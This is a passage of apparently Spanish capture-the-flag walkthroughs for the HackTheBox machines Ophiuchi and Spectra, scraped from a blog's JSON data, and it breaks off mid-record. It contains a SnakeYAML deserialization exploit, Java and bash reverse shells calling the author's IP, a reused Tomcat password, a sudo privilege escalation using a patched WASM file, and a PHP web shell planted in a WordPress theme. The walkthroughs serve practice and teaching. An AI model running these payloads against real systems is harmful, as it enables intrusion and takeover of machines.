Tomcat 9. 0. 38|_http-open-proxy: Proxy might be redirecting requests|_http-title: Parse YAMLService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20. 26 secondsBien, tenemos varias cositas:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1       8080   HTTP   Apache Tomcat 9. 0. 38   Que destacamos: Puerto 8080:  Apache Tomcat: Contenedor de clases usadas para ampliar la capacidad de un servidor (servlets), que nos permite compilar y ejecutar aplicaciones web realizadas en Java.  Java Servlet - Wikipedia.  ¬øQu√© es Apache Tomcat?. Bueno, empecemos a validar cada servicio y ver por donde podemos jugar‚Ä¶ ‚Ä¶ Puerto 8080 ‚åñ: Tenemos un analizador de formato YAML, interactuemos con √©l:  YAML (Yet Another Markup Language): Formato hecho para nosotros e. e Cosa que podamos facilmente leer lo que este pasando.  Desventajas, ventajas y uso de YAML. Si agregamos cualquier cosa, nos redirecciona al apartado Servlet: Jmmm interesante, investiguemos como podemos interactuar con esto‚Ä¶ Bueno, leyendo sobre YAML exploit nos encontramos con un art√≠culo muy llamativo hablando sobre deserializaci√≥n insegura en √©l parseo de archivos YAML. Pero antes, que es deserializaci√≥n r√°pidamente:  Deserializaci√≥n: Proceso por el cual pasan un conjunto de bytes para convertirse en un objeto entendible. La serializaci√≥n seria pasar ese objeto a bytes para almacenarlos en memoria, a bases de datos, etc. En la deserializaci√≥n es donde esta la vulnerabilidad, ya que intentara pasar los bytes a objetos y ah√≠ es donde podemos decirle que haga lo que queramos.  Deserializaci√≥n insegura.  Aprende que es deserializaci√≥n insegura. Ahora, volviendo al art√≠culo (dire mucho ¬´articulo¬ª en esta secci√≥n :P):  SnakeYaml Deserialization exploited. Nos habla de una deserializaci√≥n insegura en la cual podemos conseguir RCE en la m√°quina que lo est√© corriendo. Profundicemos en la explicaci√≥n: B√°sicamente es explotada cuando una p√°gina tiene la funcionalidad de parsear (formatear/analizar) un archivo o sintaxis YAML. Si el proceso directamente en el input genera √©l parseo llamando la funci√≥n yaml. load sin previa sanitizaci√≥n, podemos conseguir ejecucion remota de comandos en el sistema. El art√≠culo nos muestra como ser√≠a la definici√≥n de la funci√≥n yaml. load en la l√≥gica: Yaml yaml = new Yaml();Object obj = yaml. load(&lt;--user input data--&gt;);¬øPero como podemos validar que efectivamente podemos explotar esta deserializaci√≥n? Bien, el creador del art√≠culo uso un payload de un pdf el cual nos ayuda con esto: !!javax. script. ScriptEngineManager [ !!java. net. URLClassLoader [[  !!java. net. URL [ http://attacker-ip/ ] ]]]Primero debemos levantar un servidor web, usar√© Python: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Ahora en la web colocamos el payload, cambiamos nuestra IP y puerto y vemos si obtenemos alguna petici√≥n: !!javax. script. ScriptEngineManager [ !!java. net. URLClassLoader [[  !!java. net. URL [ http://10. 10. 14. 51:8000/ ] ]]]Obtenemos: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 10. 227 - - [18/Feb/2021 12:12:12] code 404, message File not found10. 10. 10. 227 - - [18/Feb/2021 12:12:12]  HEAD /META-INF/services/javax. script. ScriptEngineFactory HTTP/1. 1  404 -Bien, validamos que el payload funciona y podemos empezar a jugar para explotar esto. Vemos que esta intentando entrar a una ruta, pero al no tenerla en nuestra m√°quina, claramente recibe un c√≥digo de estado 404. ‚Ä¶ Explotaci√≥n #: Vale, el art√≠culo nos redirecciona a los CVE respectivos de la vulnerabilidad:  CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution.  CVE-2017-1000208 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution.  ‚ÄúThe snake YAML has a feature which supports for a special syntax that allows the constructor of any Java class to be called when parsing YAML data which is (!!&lt;java class constructor&gt;)‚Äù SnakeYaml Deserialization exploited. Perfecto, entonces al pasarle nuestro payload, Snake YAML llamara el constructor ScriptEngineFactory que har√° una petici√≥n hacia nuestra m√°quina. Para aprovecharnos de esto el art√≠culo nos provee con un repositorio que genera payloads para ejecutar c√≥digo en el sistema:  https://github. com/artsploit/yaml-payload. Entonces, despues de clonarnos el repo, vemos que ya tiene la estructura a la que el servidor intenta entrar: /META-INF/services/javax. script. ScriptEngineFactory. ‚ù≠ tree. ‚îú‚îÄ‚îÄ artsploit‚îÇ  ‚îî‚îÄ‚îÄ AwesomeScriptEngineFactory. java‚îî‚îÄ‚îÄ META-INF  ‚îî‚îÄ‚îÄ services    ‚îî‚îÄ‚îÄ javax. script. ScriptEngineFactory3 directories, 2 filesEntonces, la idea es que el exploit (AwesomeScriptEngineFactory. java) nos genere el payload (terminara en . class y estar√° junto al . java) para posteriormente desde la web hacer la petici√≥n a la que esta vez deber√≠a encontrar la ruta /META-INF/. . . , leer√° el archivo javax. script. ScriptEngineFactory el cual por dentro apunta a nuestro payload (el . class) que ser√≠a ejecutado en el sistema :) Modifiquemos el archivo . java para generar el . class. El original ejecuta una calculadora en mac: . . . public class AwesomeScriptEngineFactory implements ScriptEngineFactory {                          public AwesomeScriptEngineFactory() {                                try {                  Runtime. getRuntime(). exec( dig scriptengine. x. artsploit. com );      Runtime. getRuntime(). exec( /Applications/Calculator. app/Contents/MacOS/Calculator );     } catch (IOException e) {              e. printStackTrace();                                    }                  }. . . Cambi√©moslo para que nos haga una petici√≥n hacia el puerto 4433 con nc: . . . public class AwesomeScriptEngineFactory implements ScriptEngineFactory {  public AwesomeScriptEngineFactory() {    try {      Runtime. getRuntime(). exec( nc 10. 10. 14. 51 4433 );    } catch (IOException e) {      e. printStackTrace();    }  }. . . Ahora compil√©moslo: ‚ù≠ javac AwesomeScriptEngineFactory. java‚ù≠ ls AwesomeScriptEngineFactory. class AwesomeScriptEngineFactory. java ¬øQu√© es un archivo . class en Java?. Nos ponemos en escucha en Python y en nc: Ahora vamos a la web y volvemos a ejecutar el payload inicial que apunta hacia nuestra m√°quina. En nuestro servidor en Python recibimos: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 10. 227 - - [18/Feb/2021 13:13:13]  HEAD /META-INF/services/javax. script. ScriptEngineFactory HTTP/1. 1  200 -10. 10. 10. 227 - - [18/Feb/2021 13:13:13]  GET /META-INF/services/javax. script. ScriptEngineFactory HTTP/1. 1  200 -10. 10. 10. 227 - - [18/Feb/2021 13:13:13]  GET /artsploit/AwesomeScriptEngineFactory. class HTTP/1. 1  200 -Perfecto y si esperamos un momento en nuestro listener de nc tenemos: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . 10. 10. 10. 227: inverse host lookup failed: Host name lookup failureconnect to [10. 10. 14. 51] from (UNKNOWN) [10. 10. 10. 227] 48976Vale vale, tamo bieeen. Tenemos ejecuci√≥n remota de comandos en el sistema, intentemos ahora saber que usuario somos (adem√°s que nos sirve para validar si podemos ejecutar varios comandos sin problemas): . . . public class AwesomeScriptEngineFactory implements ScriptEngineFactory {  public AwesomeScriptEngineFactory() {    try {      Runtime. getRuntime(). exec( id | nc 10. 10. 14. 51 4433 );    } catch (IOException e) {      e. printStackTrace();    }  }. . . Compilamos, escuchamos y ejecutamos en la web, en Python todo correct√≠simo, pero en nc no recibimos nada‚Ä¶ Jugando con la sintaxis no logre nada, asi que podemos tomar el Runtime. getRuntime(). exec() y buscar como ejecutar comandos en linux con √©l. Obtuvimos una charlita:  Stackoverflow - Java Exec Linux Command. Bien, probemos con esa sintaxis: . . . public class AwesomeScriptEngineFactory implements ScriptEngineFactory {  public AwesomeScriptEngineFactory() {    try {      String [] cmd = {         /bin/sh ,         -c ,         id | nc 10. 10. 14. 51 4433       };      Runtime. getRuntime(). exec(cmd);    } catch (IOException e) {      e. printStackTrace();    }  }. . . Yyyyyyyyyyy: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . 10. 10. 10. 227: inverse host lookup failed: Host name lookup failureconnect to [10. 10. 14. 51] from (UNKNOWN) [10. 10. 10. 227] 48990uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)Perfecto (muchas gracias @Randall por tu respuesta de hace 9 a√±os üòÑ), somos el usuario tomcat, ahora si intentemos generar una Reverse Shell: (Despues de algunas pruebas fallidas claramente) . . . public class AwesomeScriptEngineFactory implements ScriptEngineFactory {  public AwesomeScriptEngineFactory() {    try {      String [] cmd = {         /bin/sh ,         -c ,         bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 14. 51/4433 0&gt;&amp;1'       };      Runtime. getRuntime(). exec(cmd);    } catch (IOException e) {      e. printStackTrace();    }  }. . . Y obtenemos: Perfectoooooooooooo, tamos dentro papachooooooooooooo. Bueno, antes de seguir hagamos tratamiento de la TTY (Shell) para poder tener historial de comandos con las flechas, dar CTRL + C sin miedo y dem√°s cositas, solo debemos escribir lo siguiente: tomcat@ophiuchi:/$ script /dev/null -c bash(CTRL + Z)‚ù≠ stty raw -echo‚ù≠ fg #(asi no lo veas se esta escribiendo)    resetTerminal type? xtermtomcat@ophiuchi:/$ export TERM=xtermtomcat@ophiuchi:/$ export SHELL=bashtomcat@ophiuchi:/$ stty rows 43 columns 192 #(Este depende del tamano de tu pantalla (`$ stty -a`))Y listo hemos hecho el tratamiento de la TTY perfectamente.  Savitar nos lo explica gr√°ficamente en varios videos. ‚Ä¶ Movimiento lateral #: Ahora si a enumerar‚Ä¶ La flag de user esta en el /home del usuario admin, pero no tenemos acceso a verla a√∫n: tomcat@ophiuchi:~$ ls /home/admintomcat@ophiuchi:~$ ls /home/admin/user. txttomcat@ophiuchi:~$ cat /home/admin/user. txt cat: /home/admin/user. txt: Permission denied tomcat@ophiuchi:~$ Si recordamos la estructura de tomcat sabemos que existe un archivo donde a veces se almacenan las credenciales de los usuarios que manejen el servidor tomcat:  Los nombres de usuario y las contrase√±as cifradas se almacenan en el archivo tomcat-users. xml. Las actualizaciones tales como la creaci√≥n de un usuario y el cambio de contrase√±as de usuario o de los roles de permisos de repositorio se escriben autom√°ticamente en archivo XML. IBM - Gestion de usuarios Apache Tomcat Validando su existencia: tomcat@ophiuchi:~$ ls -la conf/total 240drwxr-x--- 2 root tomcat  4096 Dec 28 00:37 . drwxr-xr-x 9 root tomcat  4096 Oct 11 14:07 . . -rw-r----- 1 root tomcat 12873 Sep 10 08:25 catalina. policy-rw-r----- 1 root tomcat  7262 Sep 10 08:25 catalina. properties-rw-r----- 1 root tomcat  1400 Sep 10 08:25 context. xml-rw-r----- 1 root tomcat  1149 Sep 10 08:25 jaspic-providers. xml-rw-r----- 1 root tomcat  2313 Sep 10 08:25 jaspic-providers. xsd-rw-r----- 1 root tomcat  4144 Sep 10 08:25 logging. properties-rw-r----- 1 root tomcat  7588 Sep 10 08:25 server. xml-rw-r----- 1 root tomcat  2234 Dec 28 00:37 tomcat-users. xml-rw-r----- 1 root tomcat  2558 Sep 10 08:25 tomcat-users. xsd-rw-r----- 1 root tomcat 172359 Sep 10 08:25 web. xmlPerfecto, si lo vemos detalladamente tenemos una credencial: . . . &lt;user username= admin  password= whythereisalimit  roles= manager-gui,admin-gui /&gt;. . . Probemos esa contrase√±a hacia la m√°quina, quiz√°s podamos reusarla: tomcat@ophiuchi:~$ su adminPassword: admin@ophiuchi:/opt/tomcat$Perfecto, somos el usuario admin, ahora si veamos como convertirnos en root‚Ä¶ ‚Ä¶ Escalada de privilegios #: Aprovechemos que tenemos la contrase√±a del usuario admin para migrarnos al servicio SSH: ‚ù≠ ssh admin@10. 10. 10. 227admin@10. 10. 10. 227's password:       Welcome to Ubuntu 20. 04 LTS (GNU/Linux 5. 4. 0-51-generic x86_64). . . Listo, mejor e. e Validando que acciones puede llevar a cabo admin como root usando sudo, tenemos: admin@ophiuchi:~$ sudo -lMatching Defaults entries for admin on ophiuchi:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser admin may run the following commands on ophiuchi:  (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index. goVale vale valeee‚Ä¶ Podemos ejecutar un programa llamado index. go usando el binario /usr/bin/go donde si empleamos sudo haremos el proceso como root. Juguemos a ver como podemos aprovechar esto. admin@ophiuchi:/opt/wasm-functions$ ls -latotal 3928drwxr-xr-x 3 root root  4096 Oct 14 19:52 . drwxr-xr-x 5 root root  4096 Oct 14 09:56 . . drwxr-xr-x 2 root root  4096 Oct 14 19:52 backup-rw-r--r-- 1 root root   88 Oct 14 19:49 deploy. sh-rwxr-xr-x 1 root root 2516736 Oct 14 19:52 index-rw-rw-r-- 1 root root   522 Oct 14 19:48 index. go-rwxrwxr-x 1 root root 1479371 Oct 14 19:41 main. wasmVeamos el archivo que podemos ejecutar: admin@ophiuchi:/opt/wasm-functions$ cat index. go package mainimport (     fmt     wasm  github. com/wasmerio/wasmer-go/wasmer      os/exec      log )func main() {    bytes, _ := wasm. ReadBytes( main. wasm )    instance, _ := wasm. NewInstance(bytes)    defer instance. Close()    init := instance. Exports[ info ]    result,_ := init()    f := result. String()    if (f !=  1 ) {        fmt. Println( Not ready to deploy )    } else {        fmt. Println( Ready to deploy )        out, err := exec. Command( /bin/sh ,  deploy. sh ). Output()        if err != nil {            log. Fatal(err)        }        fmt. Println(string(out))    }}D√©mosle un recorrido r√°pido para entender que esta haciendo:  Este ejemplo es parecido y m√°s intuitivo - Simple example Go WASM. (Igual hay bastantes en internet, pueda que me explique fatal y no se entienda nada :P) 1. Importa librer√≠as y una en especial se trata de /wasmer-go/wasmer, la definici√≥n propia del repositorio nos dice:  Wasmer enables super lightweight containers based on WebAssembly that can run anywhere: from Desktop to the Cloud and IoT devices, and also embedded in any programming language. Pero en este caso enfocado en go (wasmer-go).  ¬øQu√© es WebAssembly (WASM)?.  Basicamente es codigo nativo que el navegador va a entender a m√°s bajo nivel. 2. El archivo main. wasm se obtiene de la compilaci√≥n de un objeto . go. (Que en este caso, entiendo que no tenemos, ya que index. go es el que lo llama). No tiene ruta absoluta, por lo tanto podemos aprovecharnos para crear el propio, ya que tomara el objeto de la ruta en la que estemos.  Variables de declaraci√≥n (:=) y asignaci√≥n (=) en Go. 3. Obtiene los bytes del binario y las dem√°s variables que no usemos se guardaran en la nada.  Blank Identifier (_) in Go. 4. De la instancia de bytes extraer√° la data de info y la guardar√° en init. 5. Extrae el resultado (ah√≠ realmente no s√© que hace). Y lo guarda en formato String() sobre la variable f. 6. Simplemente v√°lida si es diferente de  1 . Si no lo es, nos imprime  Not ready to deploy , pero si es diferente de  1 . 7. Ejecuta el contenido del archivo deploy. sh. Tampoco tiene ruta absoluta, el mismo juego que con el archivo main. wasm. admin@ophiuchi:/opt/wasm-functions$ cat deploy. sh #!/bin/bash# ToDo# Create script to automatic deploy our new web at tomcat port 8080Si ejecutamos la l√≠nea que podemos correr con sudo en esta ruta tenemos el siguiente mensaje: admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index. goNot ready to deployQuiere decir que la variable f esta con un valor distinto a  1 . Lo curioso es que no tenemos manera de sobreescribir ning√∫n archivo, o crear nuevos en ninguna de estas rutas. La carpeta /backup es intrigante, pero tiene los mismos archivos que /wasm-functions (bueno, falta el index, pero no podemos generarlo, indica que no encuentra la librer√≠a de la que ya hablamos antes). Asi que tamos F, a seguir pensando como podemos explotar esto o si es un rabbit hole‚Ä¶ Podemos destacar que el  1  que necesitamos para poder entrar a ejecutar el archivo deploy. sh, viene del binario main. wasm. Asi que de alguna manera debemos cambiarlo‚Ä¶ Pensamos en buffer overflow para modificar el flujo pero jmm‚Ä¶ Bueno, despues de bastante rato perdido y sobre pensando las cosas, me fui para el foro y ah√≠ me di cuenta de algo. Es un binario wasm, por lo tanto no es human-readable, si buscamos en internet como modificar un archivo . wasm nos encontramos con una explicaci√≥n bastante interesante. En una parte nombra la herramienta que usa: wabt. La cual nos permite jugar con archivos WASM para transformarlos en formato WAT (muchas m√°s cosas), que ser√≠a el formato . txt de los binarios, asi es m√°s f√°cil de leer que esta haciendo el programa‚Ä¶ Despu√©s de instalar la herramienta, podemos pasarnos el binario main. wasm a nuestra m√°quina y verlo en formato . wat: ‚ù≠ wabt/bin/wasm2wat main. wasm (module (type (;0;) (func (result i32))) (func $info (type 0) (result i32)  i32. const 0) (table (;0;) 1 1 funcref) (memory (;0;) 16) (global (;0;) (mut i32) (i32. const 1048576)) (global (;1;) i32 (i32. const 1048576)) (global (;2;) i32 (i32. const 1048576)) (export  memory  (memory 0)) (export  info  (func $info)) (export  __data_end  (global 1)) (export  __heap_base  (global 2)))Bien, vemos el llamado a la funci√≥n info (que es de donde obtenemos el valor distinto de  1 ) y las dem√°s definiciones, pero claramente a nosotros nos interesa jugar con info‚Ä¶ Si nos fijamos la definici√≥n ser√≠a tal que as√≠: (func $info (type 0) (result i32) i32. const 0)Donde tenemos una constante con valor 0‚Ä¶ Pues si nosotros estamos esperando un 1 podemos aprovechar esa l√≠nea para cambiarle el valor. Para modificar el archivo debemos guardarlo en formato . wat y despues volverlo a pasar a formato . wasm: ‚ù≠ wabt/bin/wasm2wat main. wasm -o main. watModificamos la constante: ‚ù≠ cat main. wat (module (type (;0;) (func (result i32))) (func $info (type 0) (result i32)  i32. const 1) (table (;0;) 1 1 funcref) (memory (;0;) 16) (global (;0;) (mut i32) (i32. const 1048576)) (global (;1;) i32 (i32. const 1048576)) (global (;2;) i32 (i32. const 1048576)) (export  memory  (memory 0)) (export  info  (func $info)) (export  __data_end  (global 1)) (export  __heap_base  (global 2)))Y ahora lo pasamos a formato . wasm: ‚ù≠ wabt/bin/wat2wasm main. wat -o main. wasmListo, antes de subirlo a la m√°quina. Creemos una carpeta temporal para poner nuestros objetos de trabajo, movamos ah√≠ el archivo deploy. sh y modifiqu√©moslo para que nos entregue una Shell: admin@ophiuchi:/dev/shm/test$ cat deploy. sh #!/bin/bash/bin/bash# ToDo# Create script to automatic deploy our new web at tomcat port 8080Ahora s√≠, subamos el binario y ejecutemos la instrucci√≥n sudo: admin@ophiuchi:/dev/shm/test$ chmod + main. wasm admin@ophiuchi:/dev/shm/test$ lsdeploy. sh main. wasmadmin@ophiuchi:/dev/shm/test$ sudo /usr/bin/go run /opt/wasm-functions/index. goReady to deployadmin@ophiuchi:/dev/shm/test$ iduid=1000(admin) gid=1000(admin) groups=1000(admin)Pero no nos ha cambiado‚Ä¶ Aunque al menos sabemos que ya esta entrando a la ejecuci√≥n (: Hagamos una Reverse Shell. Nos ponemos en escucha por el puerto 4433 y modificamos el archivo deploy. sh: admin@ophiuchi:/dev/shm/test$ cat deploy. sh #!/bin/bashbash -c  bash -i &gt;&amp; /dev/tcp/10. 10. 14. 51/4433 0&gt;&amp;1 # ToDo# Create script to automatic deploy our new web at tomcat port 8080Y en el listener, obtenemos: Perfectoooooo, tenemos una Shell como el usuario root. Solo nos quedar√≠a ver las flags: ‚Ä¶ Bueno, la deserializaci√≥n se esta volviendo mi ataque favorito. Esta en todos lados :P Mu gusto mucho el inicio, la escalada estuvo interesante, pero no s√©, no me termino de gustar. Pero igual, todo es aprendizaje (: Muchas gracias por pasarse y leer este mont√≥n de cosas, que tengas una feliz noche (: Y como siempre. A. Seguir. Rompiendo. Todo. "
    }, {
    "id": 38,
    "url": "http://localhost:4000/htb/spectra",
    "title": "HackTheBox - Spectra",
    "body": "2021/06/26 - M√°quina Linux (Chromium OS) nivel f√°cil. Nos veremos las caras con WordPress y su mala configuraci√≥n por parte del administrador del sitio. Modificaremos themones para ejecutar comandos en el sistema. Encontraremos credenciales y jugaremos con archivos para configurar tareas, se volver√°n peligrosas porque podemos ejecutarlas como el usuario root, asignaremos el permiso SUID a la bash para obtener una Shell como administradores de la m√°quina.  TL;DR (Spanish writeup): Creada por: egre55. Opa opa, como es! Bueno, inicialmente nos enfrentaremos al gestor de contenido WordPress, enumerando encontraremos un ‚Äúbackup‚Äù del archivo de configuraci√≥n de la base de datos, usaremos las credenciales para ingresar a la parte administrativa de WordPress. Estando ac√° modificaremos la plantilla 404. php del theme twentyseventeen para agregar nuestro c√≥digo y asi conseguir ejecucion remota de comandos y obtener una Reverse Shell como el usuario nginx. Enumerando encontraremos una contrase√±a que esta siendo ejecutada/llamada por un archivo, si validamos contra los usuarios mediante SSH lograremos obtener una sesi√≥n como el usuario katie. Veremos que katie esta asignada al grupo developers, un grupo que tiene varios archivos de configuraci√≥n de tareas interesantes‚Ä¶ Adem√°s si validamos que puede ejecutar katie con permisos de administrador en el sistema (sudo -l), encontraremos que tiene ejecuci√≥n sobre el binario /sbin/initctl el cual principalmente se encarga de gestionar archivos de configuraci√≥n de tareas. Relacionando los archivos que encontramos y el binario, lograremos ejecutar comandos en el sistema como el usuario administrador. Asignaremos el permiso SUID al binario /bin/bash para obtener una sesi√≥n como root en la m√°quina. A darleeeeeeee‚Ä¶ ‚Ä¶ Clasificaci√≥n de la m√°quina: Algo de cositas manuales, pero le cuesta mucho ser real.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶  Enumeraci√≥n.  Explotaci√≥n.  Movimiento Lateral.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Realizaremos un escaneo de puertos para saber que servicios est√°n activos: ‚ù≠ nmap -p- --open -v 10. 10. 10. 229 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535.        ‚Äìopen   Solo los puertos que est√°n abiertos.        -v   Permite ver en consola lo que va encontrando.        -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard.    ‚ù≠ cat initScan# Nmap 7. 80 scan initiated Mon Mar 8 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 229# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 229 ()  Status: UpHost: 10. 10. 10. 229 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///, 8081/open/tcp//blackice-icecap///# Nmap done at Mon Mar 8 25:25:25 2021 -- 1 IP address (1 host up) scanned in 75. 89 secondsMuy bien, tenemos:       Puerto   Descripci√≥n         22   SSH: Acceso a un servidor remoto por medio de un canal seguro.        80   HTTP: Servidor web.        3306   MYSQL: Sistema para gestionar bases de datos.        8081   blackice-icecap: Probablemente un software para la administraci√≥n de un firewall.    Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto): ‚ù≠ nmap -p 22,80,3306,8081 -sC -sV 10. 10. 10. 229 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScanNmap 7. 80 scan initiated Mon Mar 8 25:25:25 2021 as: nmap -p 22,80,3306,8081 -sC -sV -oN portScan 10. 10. 10. 229Nmap scan report for 10. 10. 10. 229Host is up (0. 12s latency).            PORT   STATE SERVICE     VERSION22/tcp  open ssh       OpenSSH 8. 1 (protocol 2. 0)| ssh-hostkey:|_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)80/tcp  open http       nginx 1. 17. 4 |_http-server-header: nginx/1. 17. 4     |_http-title: Site doesn't have a title (text/html). 3306/tcp open mysql      MySQL (unauthorized) 8081/tcp open blackice-icecap? | fingerprint-strings:     |  FourOhFourRequest, GetRequest:|   HTTP/1. 1 200 OK|   Content-Type: text/plain  |   Date: Mon, 08 Mar 2021 21:49:30 GMT|   Connection: close |   Hello World |  HTTPOptions: |   HTTP/1. 1 200 OK|   Content-Type: text/plain|   Date: Mon, 08 Mar 2021 21:49:36 GMT|   Connection: close|_  Hello World1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port8081-TCP:V=7. 80%I=7%D=3/8%Time=60469B2E%P=x86_64-pc-linux-gnu%r(. . . );Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Mar 8 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27. 75 secondsObtenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 1 (protocol 2. 0)       80   HTTP   nginx 1. 17. 4       3306   MYSQL   MySQL (unauthorized) &lt;- (raro)       8081   HTTP   Ni idea :P   Empezamos a enumerar cada servicio a ver por donde podemos entrar‚Ä¶ ‚Ä¶ Puerto 80 ‚åñ: Bien, nos indica que est√°n esperando a que IT les configure el ‚Äúseguimiento de incidentes‚Äù y hay dos links: Si ingresamos a cualquiera de los dos, obtenemos un error:  Software Issue Tracker: http://spectra. htb/main/index. php.  Test: http://spectra. htb/testing/index. php. Vemos un dominio: spectra. htb, asi que agregu√©moslo a nuestro archivo /etc/hosts para que cuando ingresemos a la direcci√≥n IP nos redireccione/resuelva al dominio (o simplemente colocando el dominio).  The /etc/hosts file. ‚ù≠ cat /etc/hosts. . . 10. 10. 10. 229 spectra. htb. . . Y ahora validemos los links: main: testing: Interesante‚Ä¶ ‚Ä¶ main: Enumerando sabemos que estamos sobre un WordPress (gestor de contenido para crear cualquier tipo de p√°gina web). Viendo el c√≥digo fuente nos encontramos con varias rutas, en la que podemos intentar enumerar e incluso validar si alguna es vulnerable a alguna inyecci√≥n, pero no, no obtenemos ninguna respuesta de que por ah√≠ sean los tiros‚Ä¶ Como es habitual, tenemos el archivo /wp-login. php: Intentando algunos usuarios potenciales, vemos que la web v√°lida si un usuario es v√°lido asi la contrase√±a sea inv√°lida: Sabemos que el usuario administrator existe‚Ä¶ Podr√≠amos pensar en brute-force, pero pues a√∫n podemos enumerar el sitio /testing. testing: Ac√° podemos ver varios archivos si le quitamos el index. php de la ruta http://spectre. htb/testing/index. php: En esta parte sobre pens√© muuuuuuuuucho las cosas y me puse a buscar y buscar cosas, cuando realmente lo necesario estuvo siempre al inicio, si nos fijamos hay un archivo llamado wp-config. php. save que podemos intuir que es un backup del archivo wp-config. php. Si ingresamos al archivo no nos lo va a descargar (por esto quiz√°s tambi√©n lo ignore al inicio) porque la extensi√≥n no lo permite (a diferencia de si fuera un . bak que si se nos hubiera descargado al ingresar a √©l). Pero podemos descargarlo desde la consola con wget: ‚ù≠ wget http://spectra. htb/testing/wp-config. php. save‚ù≠ file wp-config. php. save wp-config. php. save: PHP script, ASCII text, with CRLF line terminatorsViendo su contenido: Efectivamente es una copia o al menos tiene el formato del archivo de configuraci√≥n y como vemos nos brinda unas credenciales de un usuario de la base de datos‚Ä¶ Probemos esas credenciales hacia el login que ten√≠amos antes a ver si logramos acceder. Con el usuario devtest nos muestra:  Unknown username. Check again or try your email address. Si validamos con el usuario administrator tenemos: Listos, la contrase√±a es v√°lida con √©l, tamos dentro :P Despues de husmear por ah√≠, record√© que una vez s4vitar dijo que si conseguimos entrar como administradores al sitio WordPress, sencillamente podr√≠amos modificar la plantilla 404. php para inyectar nuestro c√≥digo PHP y direccionarnos hacia la URL para comprobar que nuestro c√≥digo se est√© ejecutando. Vamos a hacerlo. ‚Ä¶ Explotaci√≥n #: Estando dentro tenemos el apartado &gt; Appereance &gt; Theme Editor, entramos ah√≠ y tenemos:  Tengamos en cuenta el select del tema a editar.  Si nos fijamos, tenemos la plantilla del 404. php en el theme twentytwenty, ve√°moslo. Validemos la ruta en la web: Jmm pues concuerda con que en la l√≠nea 10 del c√≥digo esta esa funci√≥n, intentemos modificar el archivo para ver si logramos inyectar c√≥digo: . . . echo  hola ;. . . Y damos clic en el bot√≥n Update File:  Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP. Obtenemos ese error‚Ä¶ Vi validamos el select (al que hice menci√≥n antes) tiene 3 themes, twentynineteen, twentyseventeen y twentytwenty. Si cambiamos el theme al twentyseventeen, vamos al c√≥digo del 404. php e intentamos hacer el mismo procedimiento de antes, tenemos: &lt;?php. . . */echo  hola ;get_header(); ?&gt;. . .  File edited successfully. Validamos ahora en la web: Perfecto, podemos ver el contenido modificado. Ahora con esto podemos ejecutar comandos en el sistema, valid√©moslo: . . . $coma=shell_exec($_GET['xmd']); echo $coma;. . . Le indicamos que nos guarde en la variable xmd todo lo que se env√≠e por medio de una petici√≥n GET (por medio de la URL) y que ese valor lo ejecute en el sistema (shell_exec) y su resultado nos lo guarde en la variable coma, despues simplemente mostramos ese valor. Ve√°moslo en ejecuci√≥n: Le decimos que nos muestre quien somos y en que hostname estamos: http://10. 10. 10. 229/main/wp-content/themes/twentyseventeen/404. php?xmd=whoami;hostname Opa, somos nginx y estamos en el host principal. Entabl√©monos una Reverse Shell: Bueno, despues de varios intentos nos damos cuenta de que nc no esta instalado o no lo toma, tambi√©n vemos que hay problemas con bash, ya que si intentamos establecer la RevSH cre√°ndonos un archivo que cuando se ejecute nos lanc√© la petici√≥n para la Shell no hace nada: Creamos el archivo: ‚ù≠ cat rerere. sh#!/bin/bashbash -i &gt;&amp; /dev/tcp/10. 10. 14. 194/4433 0&gt;&amp;1Creamos servidor web con Python: ‚ù≠ python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Nos ponemos en escucha: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . Y 